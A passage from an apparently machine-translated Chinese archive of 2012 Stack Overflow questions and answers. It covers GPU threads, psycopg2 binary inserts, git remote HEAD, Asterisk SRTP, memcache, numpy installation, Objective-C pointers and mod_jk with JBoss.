并非所有线程都同时执行。确切的数字可能发生了一些变化，但几年前，高端 CPU 能够一次保持 16k 线程运行，但实际上“只有”几百个线程同时执行。（然后将其进一步细分为更小的子组，并且这样的子组中的每个线程都以精确的锁步、逐条指令、逐个分支的方式运行）其余的被挂起，等待 I/O 或以其他方式阻塞。

因此，如果您有一个需要 200 万次执行的算法，那么在任何时候它们中只有一小部分会以线程的形式存在，而其中只有一小部分实际上是在一个批次中执行的。在当前正在执行的线程中，有一些被迫以精确的步调运行（因此不存在一个线程提前退出，整个组必须遵循相同的路径），但不同的组可以在不同的时间终止.

是的，GPU 上的线程很复杂。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T09:20:55.440

如果您有一个非常繁重的算法，并且正在使用您的图像进行后缓冲渲染，它可能会造成停顿。强制后台缓冲区等待图像。尝试在下一帧渲染它。所以你是“落后的”。

你的算法看起来如何？

# iphone - 如何使用 ALAssetsLibrary 访问照片而不在 iOS5 中请求位置访问？

> ID：13061355
> 
> 赞同：0
> 
> 时间：2012-10-25T03:58:39.983
> 
> 标签：iphone, ios, alassetslibrary

我在 iOS5 中使用 ALAssetsLibrary 请求访问照片。它询问用户应用程序是否可以访问位置服务。如果用户选择否，我的应用程序无法访问照片。

如何在不要求用户访问位置服务的情况下访问照片？

特别感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:04:53.837

如果用户拒绝您的位置访问，您必须回退到使用 UIImagePickerController。这很糟糕，我知道。

# c - 压缩源代码并将其存储在 makefile 的特定位置

> ID：13061356
> 
> 赞同：0
> 
> 时间：2012-10-25T03:58:52.870
> 
> 标签：c, makefile, zip

我运行一个模型，我偶尔需要更改它的源代码。我想在 makefile 中有一个规定，它会自动压缩与特定运行相关的所有源文件并将它们与输出文件一起存储。是否可以从生成文件中执行此操作？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:07:41.190

我同意[约翰的评论](https://stackoverflow.com/questions/13061356/zip-up-source-code-and-store-it-in-specfic-location-from-makefile/13061427#comment17739685_13061356)。但这是在 Makefile 中做的小菜一碟：

```
ARCHIVE = src.tar.gz

$(ARCHIVE): $(C_FILES)
    tar cvzf $(ARCHIVE) $(C_FILES) 
```

您可以根据自己的喜好对其进行调整。

# python - psycopg - 将压缩后的数据插入 bytea 列

> ID：13061358
> 
> 赞同：7
> 
> 时间：2012-10-25T03:59:18.197
> 
> 标签：python, postgresql, psycopg2

[我正在尝试 gzip 一个字符串，然后使用psycopg2](http://www.initd.org/psycopg/)将其写入`bytea`列中。

**桌子：**

```
CREATE TABLE test
(
  data bytea
) 
```

**插入：**

```
import psycopg2

data = "some string".encode("zlib") # 'x\x9c+\xce\xcfMU(.)\xca\xccK\x07\x00\x1ak\x04l'

conn = psycopg2.connect("my parameters")
cur = conn.cursor()
cur.execute("INSERT INTO public.test VALUES (%s)", (data,))

    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
    psycopg2.DataError: invalid byte sequence for encoding "UTF8": 0x9c 
```

这是图书馆的问题吗？我需要以某种方式更改编码吗？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-10-25T04:05:15.317

如果要将二进制数据插入数据库，则需要使用 psycopg2.Binary() 包装器。像您所做的那样使用字符串会导致数据被视为文本，由于编码问题而被拒绝，或者在您尝试再次阅读时被接受但被破坏。

尝试将最后一个执行调用替换为：

```
cur.execute("INSERT INTO public.test VALUES (%s)", (psycopg2.Binary(data),)) 
```

# git - 为什么 'git 远程显示 ' 显示远程HEAD不明确，可能是以下之一

> ID：13061364
> 
> 赞同：2
> 
> 时间：2012-10-25T03:59:39.960
> 
> 标签：git

为什么当我运行“git remote show”时它说

```
 HEAD branch (remote HEAD is ambiguous, may be one of the following):
    dev
    master
  Remote branches:
    dev                                   tracked
    master                                tracked 
```

为什么 git 不知道远程 HEAD 分支？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T05:17:05.863

因为 SHA1 引用 by`remote/HEAD`与`remote/master`or相同`remote/dev`。

[您可以在“错误与 git：远程 HEAD 不明确，可能是以下之一](https://stackoverflow.com/a/2575984/6309)”中找到更多详细信息。

正如这个[更新的线程](http://git.661346.n2.nabble.com/remote-s-HEAD-not-detected-correctly-td6074877.html)（2011）中提到的：

> 对。传输协议不公开符号引用指向的名称，只公开其当前值。因此，客户端被迫通过寻找当前 SHA-1 相同的另一个参考来进行猜测。如果有多个，它会采取最好的猜测。
> 
> 已经进行了一些尝试来扩展协议并包含当前的符号引用目标名称，但到目前为止，它还没有超出构思阶段。

[虽然已经提出了](http://thread.gmane.org/gmane.comp.version-control.git/102039)一个补丁（但仅作为“本地存储库的快速而肮脏的补丁”）。

# google-app-engine - 从 GAE createUploadUrl 访问底层 Google Cloud Storage 对象

> ID：13061368
> 
> 赞同：4
> 
> 时间：2012-10-25T04:00:18.257
> 
> 标签：google-app-engine, google-cloud-storage

我正在尝试将用户照片上传存储在 Google Cloud Storage 中，但在通话时遇到问题：

```
blobStoreService.createUploadUrl(...) 
```

我需要跟踪与上传文件关联的用户 ID。如果用户的 ID 是 1234，我需要将其作为元数据存储在 Cloud Storage 文件中。

我可以在直接创建 Cloud Storage 文件时添加元数据：

```
GSFileOptionsBuilder optionsBuilder = new GSFileOptionsBuilder()
    .setBucket("myBucket")
    .setKey(key) // path...
    .addUserMetadata("userId", "1234"); 
```

但我真的很想使用 GAE 提供的 BlobStoreService.createUploadUrl(...) 因为它支持的文件比上面的代码可以处理的更大。是否可以使用 createUploadUrl 指定元数据？或者甚至可以找出创建了哪个谷歌存储密钥/文件名？

* * *

**更新** 我已经从上传回调 serlvet 获得了 blobKey。但是，我找不到将元数据添加到与此 blobKey 关联的*Google 存储文件的方法。*至少在本地，它认为它是一个 BlobStore 条目，而不是一个 GS 文件

```
 // get the key:
    Map<String, List<BlobKey>> blobKeysFromPost=BlobstoreServiceFactory.getBlobstoreService().getUploads(request);

    // pull out the blobKey generated from the recently submitted POST
    BlobKey blobKey = ... 

    // Now how do I access the cloud storage entry for this key?  I tried:
    AppEngineFile file = FileServiceFactory.getFileService().getBlobFile(blobKey);

    // But this file locally returns "blobstore":
    file.getFileSystem().getName(); // Should be GS. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T15:29:20.807

我认为这是一个错误，即 Google Storage 中的文件上传被赋予 BlobKeys，表明它们在 BlobStore 中。在不知道生成的文件名的情况下，我们无法在 GS 中与上传的文件进行交互。例如，我们不能在文件上添加元数据、更改 ACL、删除等......

我在 GAE 跟踪器中打开了这个问题： [http ://code.google.com/p/googleappengine/issues/detail?id=8337](http://code.google.com/p/googleappengine/issues/detail?id=8337)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T11:50:13.907

从文档：

> 当用户提交表单时，POST 由创建 Blob 的 Blobstore API 处理。API 还为 blob 创建一条信息记录并将记录存储在数据存储中，**并将重写的请求作为 blob 键传递给给定路径上的应用程序：**

[https://developers.google.com/appengine/docs/java/blobstore/overview#Uploading_a_Blob](https://developers.google.com/appengine/docs/java/blobstore/overview#Uploading_a_Blob)

因此，一旦上传，您将获得 blob 密钥，然后您可以保存并添加元数据。我只知道 Python，但 AFAIK 你不能将那种元数据添加到 blobstore 实体中，你必须自己跟踪它。

# asterisk - 在 Asterisk 1.8.1 中配置 SRTP

> ID：13061369
> 
> 赞同：0
> 
> 时间：2012-10-25T04:00:20.700
> 
> 标签：asterisk, rtp

我正在使用 jitsi 和星号 1.8.1。我成功地在它们之间配置了 TLS。它工作正常。现在我正在它们之间配置 SRTP。

以下是配置文件。

sip.conf

```
[general]
context=incoming
allowguest=no
alwaysauthreject=yes
allow=ulaw
allow=alaw
allow=gsm

tlsenable=yes
tlsbindaddr=0.0.0.0
tlscertfile=/etc/asterisk/keys/newbie.pem
tlscafile=/etc/asterisk/keys/ca.crt
tlscipher=ALL
tlsclientmethod=tlsv1

[user1]
type=peer
defaultuser=user1
secret=1000
dtmfmode=rfc2833
callerid="User one"
host=dynamic        ; The device must always register
canreinvite=no
nat=yes
encryption=yes
transport=tls

; Deny registration from anywhere first
deny=0.0.0.0/0.0.0.0
; Replace the IP address and mask below with the actual IP address and mask
; of the computer running the softphone, or the address of the hardware phone,
; either a host address and full mask, or a network address and correct mask,
; registering will be allowed from that host/network.
permit=192.168.51.0/255.255.255.0
context=myphones

[user2]
type=peer
defaultuser=user2
secret=1001
dtmfmode=rfc2833
callerid="User two"
host=dynamic        ; The device must always register
canreinvite=no
nat=yes
encryption=yes
transport=tls

; Deny registration from anywhere first
deny=0.0.0.0/0.0.0.0
; Replace the IP address and mask below with the actual IP address and mask
; of the computer running the softphone, or the address of the hardware phone,
; either a host address and full mask, or a network address and correct mask,
; registering will be allowed from that host/network.
permit=192.168.51.0/255.255.255.0
context=myphones 
```

扩展名.conf

```
[general]
static=yes
writeprotect=no
clearglobalvars=no

[incoming]
exten => s,1,Hangup()

[myphones]
exten => user1,1,Set(CHANNEL(secure_bridge_signaling)=1)
exten => user1,n,Set(CHANNEL(secure_bridge_media)=1)
exten => user1,n,Dial(SIP/user1)
exten => user1,n,Hangup()

exten => user2,1,Set(CHANNEL(secure_bridge_signaling)=1)
exten => user2,n,Set(CHANNEL(secure_bridge_media)=1)
exten => user2,n,Dial(SIP/user2)
exten => user2,n,Hangup()

exten => 201,1,Answer()
exten => 201,n,Playback(tt-monty-knights)
exten => 201,n,Hangup()
exten => 202,1,Answer()
exten => 202,n,Playback(welcome)
exten => 202,n,Playback(demo-echotest)
exten => 202,n,Echo()
exten => 202,n,Playback(demo-echodone)
exten => 202,n,Playback(vm-goodbye)
exten => 202,n,Hangup() 
```

我也上传了 srtp 模块。它被加载了。但是当 user1 调用 user2 时，我的星号服务器出现分段错误并关闭。

这里有关于如何配置 srtp 的帮助吗？不管我做对了还是有什么问题..

我已经在[http://forums.asterisk.org/viewtopic.php?f=1&t=84587发布了这个问题](http://forums.asterisk.org/viewtopic.php?f=1&t=84587)

提前致谢。，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T05:07:59.920

Asterisk 1.8 原生支持 SRTP。因此，您可以使用 Asterisk 1.8.x 服务器轻松尝试此操作。本系统不支持普通的 SIP 电话。您需要找到支持 SRTP 和支持 TLS 的 IP/软电话进行设置。为此使用闪烁软电话 (http://www.icablink.com)。我按照以下文章设置了安全的 VoIP 系统。

对于 SRTP：[http ://www.remiphilippe.fr/2011/01/16/asterisk-srtp-with-1-8/](http://www.remiphilippe.fr/2011/01/16/asterisk-srtp-with-1-8/)

对于 TLS：[https](https://wiki.asterisk.org/wiki/display/AST/Secure+Calling+Tutorial) ://wiki.asterisk.org/wiki/display/AST/Secure+Calling+Tutorial，（您可以从这里找到 ast_tls_cert 脚本：[https](https://reviewboard.asterisk.org/r/979/diff/) ://reviewboard.asterisk.org/r/979/diff/ )

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-25T10:08:17.890

我知道这是一个老问题，但是我遇到了同样的问题。我发现了这个解释，所以我想我会在最后标记它，以防其他人遇到同样的问题（或者在我们的情况下缺乏理解！）

可以在这里找到帖子：http: [//permalink.gmane.org/gmane.comp.voip.sip-communicator.user/921](http://permalink.gmane.org/gmane.comp.voip.sip-communicator.user/921)

> Jitsi 确实支持 SRTP，但它是通过 ZRTP 密钥协商来实现的。这具有提供端到端加密的优势（与可以在服务器上窃听的 Asterisk 中的标准 SRTP 实现相反）。
> 
> 然而，Asterisk 不支持它，因此您需要使用实际的 SIP 和 RTP 代理才能使其工作。
> 
> 希望这可以帮助，
> 
> 埃米尔

# google-app-engine - memcache 如何在社交网络环境中使用？

> ID：13061371
> 
> 赞同：2
> 
> 时间：2012-10-25T04:00:35.253
> 
> 标签：google-app-engine, webserver, memcached

我知道这是一个非常模糊的问题，但我正在寻找一个非常抽象的答案。自从几个月前我开始使用 GAE 以来，我一直认为 memcache 没有用，而且会带来不必要的麻烦，因为它真的没那么重要。但似乎 memcache 被称赞为一个非常有益的功能，谷歌甚至说“高性能可扩展 Web 应用程序通常在某些任务之前使用分布式内存数据缓存或代替健壮的持久存储。”，等等我认为这一定有一些值得研究的地方。

我只是不明白。它对性能有什么好处？首先你必须检查内存缓存中是否有东西，如果没有，查询。我一直认为不必处理它会更快，无论如何都可以查询，但这似乎是一种幼稚的方法？这有多大的不同？

我想我从来不明白 memcache 的用处。我可以看到它在 Stackoverflow 主页上的用处，所有用户几乎都看到相同的东西，所以它会很有用，实际上在这种情况下不使用 memcache 是愚蠢的。但是说像Facebook这样的社交网络。每个用户都会看到不同的东西。没有两个人看到相同的数据和内容，而且事情变化如此之快，以至于 memcache 可能需要不断更新。在这样的场景下，memcache 能起到什么作用呢？

另外，在像社交网络这样的私人网站中，如果每个用户都必须在 memcache 中存储不同的信息，那么 memcache 到底能适应多少？我知道 GAE 没有提及其内存缓存的大小，那么存储数十万条记录是否安全？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T04:03:59.623

您将 memcache 用于您可能经常需要的东西。检查内存缓存中是否有东西*很快*。从 memcache 中获取它*很快*。如果您可以省去自己进行查询的工作，那么您就可以节省大量时间。

例如，考虑以下两种情况：

*   两个人请求您的主页。这两个请求都作为页面加载的一部分进行查询。
*   两个人请求您的主页。两者都检查缓存；一个执行查询并存储它，另一个获取缓存的结果。

从 memcache 中获取（或存储）某些东西的时间大约为 2-3 毫秒。从数据库获取东西的大概时间是 100 毫秒。

因此，对于第一种情况，您总共有 100 毫秒 x2 = 200 毫秒。

在第二种情况下，您有 3 毫秒（查找失败）+ 100 毫秒（查询）+ 3 毫秒（存储）+ 3 毫秒（成功查找）= 总共 109 毫秒。

您总共节省了近 50%。

现在考虑可能有 10 个人请求您的主页。在第一种情况下，每增加一个人将是另外 100 毫秒。第二种情况每个人只有3ms。

* * *

另请注意，您不必一次将整个页面存储在内存缓存中。您也可以存储*部分*页面。当然，并非所有用户都拥有所有相同的数据，但他们之间肯定有一些东西是共享的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T06:24:28.170

**尺寸**

您不能依赖内存缓存的大小。为了弄清楚每个应用程序有多少数据，人们进行了各种尝试，结果各不相同。

**可靠性**

这不可靠。您的 memcache 条目的生命周期与一组黑盒（对用户）值有关，例如请求它们的频率以及自上次请求以来已经过去了多长时间。

Google 将尝试保留经常使用的条目，并随机（从您的角度）将它们从内存缓存中删除。

**提示**

尝试将其用于所有人共享、经常请求或计算成本高昂的项目。很好的例子是用户实体，因为只有一个用户被加载，他们可能会多次与您的应用交互。另一个可能是您在其中放置用户特定数据的模板，或者如果只有一小部分会更改，则可以是整个页面。对于 Facebook，它可能是整个模板、诸如“这些朋友正在聊天”之类的部分、诸如“您可能想试试这个游戏”之类的公司范围的部分，或者将推送给许多当前在线朋友的新帖子。

对每种类型的实体使用不同的缓存期。通过将一个实体的到期日期设置为比另一个更短，提示 App Engine 最有用的是保留更长时间。一个缓存页面可能只有用 30 秒，一个用户条目可能有用一个小时。

这是一种有限的资源，Google 将针对多个客户/应用程序进行优化，以造福所有客户。如果您的应用程序没有受到攻击，而另一个应用程序需要更多的内存缓存，那么 Google 会退出您的内存缓存条目。

# php - 如何从 Wordpress 中的图像中删除标题属性？

> ID：13061375
> 
> 赞同：0
> 
> 时间：2012-10-25T04:00:58.420
> 
> 标签：php, javascript, wordpress

当您将鼠标悬停在 Safari 等浏览器中的图像上时，我的客户并不太喜欢您看到的工具提示。 ![在此处输入图像描述](../Images/1671722bf4131975c1461097be2a1db8.png)

工具提示在 img 标签中显示 title 属性，这是 Wordpress 强制您拥有的。从标签中删除标题值（使用 jQuery 很容易做到）仍然会显示一个空白工具提示。

所以我不需要这样做的解决方案：

```
<img title=" " src="foobar.png" /> 
```

我需要一个解决方案来做到**这一点**：

```
<img src="foobar.png" /> 
```

我在整个互联网上进行了搜索，[接近的答案](http://www.kevinleary.net/remove-title-attributes-images-wordpress/)似乎不起作用。我相信可以通过覆盖生成图像标签的 Wordpress 核心功能来完成。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T04:07:01.913

如果您想要一个直接的 JavaScript 解决方案，这应该可以：

```
var imgs = document.getElementsByTagName('img');
for (var i = 0; i < imgs.length; i++) {
  imgs[i].removeAttribute('title');
} 
```

# python - 在 linux red hat 上安装 numpy 的错误

> ID：13061379
> 
> 赞同：14
> 
> 时间：2012-10-25T04:01:11.980
> 
> 标签：python, linux, numpy, scipy

我正在尝试从[http://www.scipy.org/Download](http://www.scipy.org/Download)安装 numpy 。

经过`git clone git://github.com/numpy/numpy.git numpy`

但是，当我跑`python setup.py install`

我有：

`SystemError: Cannot compile 'Python.h'. Perhaps you need to install python-dev|python-devel`

从哪里获得 python-dev ？

我试过了：

```
$ easy_install python-devel
Searching for python-devel
Reading http://pypi.python.org/simple/python-devel/
Couldn't find index page for 'python-devel' (maybe misspelled?)
Scanning index of all packages (this may take a while)
Reading http://pypi.python.org/simple/
No local packages or download links found for python-devel
error: Could not find suitable distribution for Requirement.parse('python-devel') 
```

和

```
$ easy_install python-dev
Searching for python-dev
Reading http://pypi.python.org/simple/python-dev/
Couldn't find index page for 'python-dev' (maybe misspelled?)
Scanning index of all packages (this may take a while)
Reading http://pypi.python.org/simple/
No local packages or download links found for python-dev
error: Could not find suitable distribution for Requirement.parse('python-dev') 
```

任何帮助将不胜感激。

为了解决python-dev的问题，我在本地目录下安装了python2.6。

但是，当我使用 python setup.py install --user 安装 numpy 时，

我有：

$ python setup.py install --user

“导入站点”失败；

使用 -v 进行回溯 Traceback（最近一次调用最后一次）：文件“setup.py”，第 18 行，

在导入操作系统 ImportError 中：

没有名为 os 的模块

在python2.6

我得到了：>>> import os Traceback（最近一次调用最后一次）：文件“”，第 1 行，在 ImportError：没有名为 os 的模块

任何帮助将不胜感激。谢谢

以下链接没有帮助，因为我没有 root 权限并且无法使用 sudo。

[示例1](https://stackoverflow.com/questions/11073695/why-does-installing-numpy-require-python-dev-in-kubuntu-12-04)

[示例2](https://stackoverflow.com/questions/2546676/how-to-install-python2-6-devel-package-under-centos-5)

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-22T12:45:00.163

如果您在 Ubuntu（例如 Ubuntu 12.04）中，这很容易，

```
sudo apt-get install python-numpy 
```

或者您可以通过 pip 从源代码编译（我认为在 RedHat 上几乎相同）：

```
sudo apt-get install python-dev  
sudo apt-get install python-pip  
pip install numpy 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-25T04:08:38.760

python-dev 不是 python 模块。实际上它是“用于构建 Python 模块、扩展 Python 解释器或将 Python 嵌入应用程序的头文件、静态库和开发工具”。您可以通过 Synaptic 软件包管理器、软件中心或 yum 安装它。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-12-28T06:42:17.607

在 CentOS 上，python 开发库的名称是 python-devel，而不是 python-dev。

使用 sudo`yum install python-devel`将它们安装在您的 CentOS 系统上。

# html - Html 替换单选按钮文本

> ID：13061380
> 
> 赞同：1
> 
> 时间：2012-10-25T04:01:26.497
> 
> 标签：html

我想显示一个带有谷歌地图的单选按钮。有没有办法使用谷歌地图而不是单选按钮的字符串。

我可以显示谷歌地图和单选按钮。

但是，我不知道如何用谷歌地图替换单选按钮文本。你能帮我么？

**HTML 代码**

```
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="inital-scale=1.0 , user-scalable=no" />
 <script src="http://maps.googleapis.com/maps/api/js?&sensor=false"></script>

        <script >
        function initialize() {

            var fenway = new google.maps.LatLng(48.1391265, 11.580186300000037);

            var mapOptions = {
                zoom: 10,
                center: fenway,
                mapTypeId: google.maps.MapTypeId.ROADMAP

            };

            var map= new google.maps.Map(document.getElementById("map_canvas"),mapOptions);

        }
    </script>
</head>

<body onload="initialize()">
<div id="map_canvas" style="width: 500px; height: 500px"></div>

<form>
<input type="radio" name="A" value="c1">1<br>
<input type="radio" name="B" value="c2">2
</form>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:20:33.223

单选按钮本身没有显示文本。您使用标签将可点击的内容与单选按钮相关联，如下所示：

```
<input type="radio" name="foo" id="foo1" /><label for="foo1">Foo #1</label> 
```

因此，如果您想让文本以外的内容成为“可点击的内容”，只需将文本替换为 Google 地图小部件即可。

```
<input type="radio" name="foo" id="foo1" />
<label for="foo1">
    <div id="map_canvas" style="width: 300px; height: 200px"></div>
</label> 
```

**编辑：** 没有看到你的 CSS，你可能在某处有类似的东西：

```
label
{
    display:block;
} 
```

所以试试这个：

```
<input type="radio" name="foo" id="foo1" />
<label for="foo1" style="display:inline;">
    <div id="map_canvas" style="width: 300px; height: 200px"></div>
</label> 
```

# objective-c - Objective-C 中的“&error”是什么意思？

> ID：13061381
> 
> 赞同：4
> 
> 时间：2012-10-25T04:01:31.543
> 
> 标签：objective-c, ios, nserror

> **可能重复：**
> [为什么这里使用“error:&error”（objective-c）](https://stackoverflow.com/questions/8334518/why-is-errorerror-used-here-objective-c)

```
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device
                                                                    error:&error]; 
```

`&`上面代码中的符号是 什么意思？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T04:10:57.563

error 是指向错误对象的指针。&error 是一个指向错误对象的指针。如果您将一个指向错误指针的指针传递给方法，然后发生错误，则该方法可以分配一个错误对象并将您的错误指针设置为指向它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T04:38:19.097

& 符号用于传递前缀变量的地址。它也称为按引用传递，而不是按值传递。所以 &error 表示错误的地址。由于 error 被定义为一个指针，因此 &error 是指向错误实际存储的指针的地址。

您调用的方法可能将参数定义为**error，从而迫使您将指针传递给指针，或对指针的引用。

如果一个方法使用 *error 作为参数，该方法可以改变参数指向的值。当方法返回控制权时，调用者可以引用此值。但是，当该方法使用**error作为参数时，该方法也可以改变指针本身，使其指向另一个位置。这意味着调用者的错误变量将因此包含一个新指针。

这是一个例子

```
 -(void)changePointerOfString:(NSString **)strVal {
        *strVal = @"New Value";
    }

    -(void)caller {
        NSString *myStr = @"Old Value";      // myStr has value 'Old Value'
        [self changePointerOfString:&myStr]; // myStr has value 'New Value'
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T04:04:46.760

它是操作符的地址；它产生一个指向所指对象的指针。在这种情况下，`error`是`NSError *`; `AVCaptureDeviceInput deviceInputWithDevice:error:`获取一个地址，并可以`error`通过该指针进行修改以指示发生的错误。

# mysql - 在 MySQL 中使用停用词进行全文搜索

> ID：13061382
> 
> 赞同：2
> 
> 时间：2012-10-25T04:02:01.073
> 
> 标签：mysql, search, full-text-search, stop-words

我在 MySQL 中使用全文搜索。但是当用停用词搜索它时，结果是空的。

我想要的是像我们使用 LIKE 一样的操作。意思是，它与所有单词有关。使用全文搜索后，我觉得它比 LIKE 更强大，它可以与索引 FULLTEXT 一起使用，具有多个字段。

但是，当 AGAINST 中的搜索条件在停用词列表中时，结果为空。

如何在 MySQL 中使用全文搜索来过滤 Stopword 中的单词？或者我可以与搜索算法一起使用的其他方式？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T22:22:24.567

我能想到的唯一方法是弄乱[ft_stopword_file](http://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_ft_stopword_file)系统变量。特别注意：

> 将此变量设置为空字符串 ('') 将禁用停用词过滤

不幸的是，此设置不能即时更改，主要是因为全文索引必须在更改后重新构建。

# objective-c - 带有设备令牌和 UDID 的 Apple 推送通知

> ID：13061384
> 
> 赞同：1
> 
> 时间：2012-10-25T04:02:12.503
> 
> 标签：objective-c, push-notification, push, apple-push-notifications, udid

我正在维护一个使用 UDID 和设备令牌来实现 iphone 推送通知的项目。起初我们使用 UDID 进行推送，但之后 Apple 拒绝使用 UDID 的其他应用程序（不是我们的应用程序），因此我们计划将所有东西都使用设备令牌而不是 UDID。但是在我们的服务器存储了许多来自用户的 UDID，我们希望继续使用 UDID 与我们的服务器和设备令牌进行推送通知。我们可以将它们都保存在我们的服务器中吗？苹果允许这样做吗，我们有机会被苹果团队拒绝吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T04:07:03.363

据我所知，任何收集 UDID 的应用程序都会被拒绝。如果你需要使用类似 UDID 的东西，你可以试试 OpenUDID。但是对于推送通知，没有必要使用 UDID，仅设备令牌就可以完成工作。我建议使用 OpenUDID 和设备令牌或单独的设备令牌建立一个新的数据系统。

# java - Apache/mod_jk 模块在运行一段时间后无法连接 jboss

> ID：13061385
> 
> 赞同：3
> 
> 时间：2012-10-25T04:02:13.367
> 
> 标签：java, apache, tomcat, jboss

我使用[Apache/mod_jk 模块](http://tomcat.apache.org/download-connectors.cgi)来连接 jboss。但是运行一段时间后，出现了问题。

Apache：2.2.22 mod_jk：1.2.37 Jboss：5.1.0 GA（集群环境） 操作系统：CentOS 5.2 x86_64 JDK：1.6.0_30-b12

这是 mod_jk.log 的一部分

```
[Thu Oct 18 15:21:35.044 2012] [26272:47208100643936] [error] ajp_connect_to_endpoint::jk_ajp_common.c (1035): (node1) cping/cpong after connecting to the backend server failed (errno=110)
[Thu Oct 18 15:21:35.044 2012] [26272:47208100643936] [error] ajp_send_request::jk_ajp_common.c (1630): (node1) connecting to backend failed. Tomcat is probably not started or is listening on the wrong port (errno=110)
[Thu Oct 18 15:22:35.643 2012] [26272:47208100643936] [error] ajp_connect_to_endpoint::jk_ajp_common.c (1035): (node1) cping/cpong after connecting to the backend server failed (errno=110)
[Thu Oct 18 15:22:35.643 2012] [26272:47208100643936] [error] ajp_send_request::jk_ajp_common.c (1630): (node1) connecting to backend failed. Tomcat is probably not started or is listening on the wrong port (errno=110)
[Thu Oct 18 15:22:35.643 2012] [26272:47208100643936] [error] ajp_service::jk_ajp_common.c (2626): (node1) connecting to tomcat failed.
[Thu Oct 18 15:23:36.143 2012] [26272:47208100643936] [error] ajp_connect_to_endpoint::jk_ajp_common.c (1035): (node2) cping/cpong after connecting to the backend server failed (errno=110)
[Thu Oct 18 15:23:36.143 2012] [26272:47208100643936] [error] ajp_send_request::jk_ajp_common.c (1630): (node2) connecting to backend failed. Tomcat is probably not started or is listening on the wrong port (errno=110)
[Thu Oct 18 15:24:36.742 2012] [26272:47208100643936] [error] ajp_connect_to_endpoint::jk_ajp_common.c (1035): (node2) cping/cpong after connecting to the backend server failed (errno=110)
[Thu Oct 18 15:24:36.742 2012] [26272:47208100643936] [error] ajp_send_request::jk_ajp_common.c (1630): (node2) connecting to backend failed. Tomcat is probably not started or is listening on the wrong port (errno=110)
[Thu Oct 18 15:24:36.742 2012] [26272:47208100643936] [error] ajp_service::jk_ajp_common.c (2626): (node2) connecting to tomcat failed.
[Thu Oct 18 15:24:36.742 2012] [26272:47208100643936] [error] service::jk_lb_worker.c (1485): All tomcat instances failed, no more workers left 
```

http.conf 的一部分：

```
JkWorkersFile conf/workers.properties
JkMountFile conf/uriworkermap.properties
JkLogFile logs/mod_jk.log
JkLogLevel warn 
```

工人属性：

```
 worker.list=loadbalancer,loadbalancer_2,status
 worker.node1.port=8009
 worker.node1.host=10.123.76.6
 worker.node1.type=ajp13
 worker.node1.lbfactor=1

 worker.node2.port=8009
 worker.node2.host=10.123.76.4
 worker.node2.type=ajp13
 worker.node2.lbfactor=1

 worker.loadbalancer.type=lb
 worker.loadbalancer.balance_workers=node1,node2

 worker.loadbalancer.sticky_session=true
 worker.loadbalancer.sticky_session_force=false

 worker.loadbalancer_2.type=lb
 worker.loadbalancer_2.balance_workers=node1,node2
 worker.loadbalancer_2.sticky_session=true
 worker.loadbalancer_2.sticky_session_force=false 
```

**注意**：Jboss 工作正常。 `telnet`jboss`8009`是正常的。如果你重新启动 jboss，它会再次工作。但是如果你重启apache就没有用了。</p>

有人遇到过这个问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T00:10:36.757

我认为为 ajp 连接器设置连接超时可以解决您的问题。这样的设置应该可以

```
<Connector port="8009" address="${jboss.bind.address}" protocol="AJP/1.3"
         emptySessionPath="true" enableLookups="false" redirectPort="8443" maxThreads="1000" connectionTimeout="60000000" /> 
```

你在 server.xml 中配置它

有关此属性的更多文档，您可以在官方文档[http://docs.jboss.org/jbossweb/latest/config/ajp.html中阅读](http://docs.jboss.org/jbossweb/latest/config/ajp.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-28T16:37:47.180

您是否在 server.xml 文件中设置了正确的 jvmRoute？

```
jboss-as/server/${profile}/deploy/jbossweb.sar/server.xml 
```

确切的行应该是这样的：

```
<Engine name="jboss.web" defaultHost="localhost" jvmRoute="node1"> 
```

在第二台服务器上会有 jvmRoute="node2"。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-01-03T05:51:32.143

请按照以下方式解决问题。1.从不同的浏览器点击URL而不重新启动网络服务器。（如果它不工作下面的解决方案将适用于你）

请检查两个 JBoss 配置必须启用 8009(AJP) 端口。在您的情况下，两个不同的物理服务器中有两个实例。必须配置上述端口。它是默认设置。检查是否误改。基本上这对应于 http 偏移量 0。

# javascript - 如果子元素包含一些自定义过滤的文本，如何调用元素？

> ID：13061389
> 
> 赞同：0
> 
> 时间：2012-10-25T04:03:05.013
> 
> 标签：javascript, jquery, html, ajax, regex

假设我们有一个包含以下内容的页面：

```
<div data-search="type1">
any html
<!-- that is, .click is a child of any level -->
<span class="click" data-source="page1.html">blue</span>
<!-- let's call it "click1" -->
<span class="click" data-source="page1.html">  blue <span class="variable">thing</span>  </span>
<!-- let's call it "click2" -->
<span class="click" data-source="page1.html"> blue<span class="variable">bell</span></span>
<!-- let's call it "click3" -->
any html
